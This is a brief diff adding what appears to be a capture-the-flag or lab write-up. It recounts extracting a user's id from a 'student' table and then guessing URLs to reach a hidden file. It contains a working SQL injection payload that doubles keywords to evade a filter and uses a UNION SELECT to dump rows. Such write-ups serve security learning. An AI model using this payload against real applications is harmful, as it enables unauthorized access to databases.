@@ -1,0 +1,3 @@
+ALl i needed was to find the id from student table where usname is lfi and then i had some hit and tries with the URL to get the gRaB file after inspecting my profile image in a new tab.
+
+Query: pramod' oorr '1' = '1' uniunionon selselectect 1,id,3,4,5,6,7,8,9,10,11,12,13,14 from student whwhereere uname='lfi' #
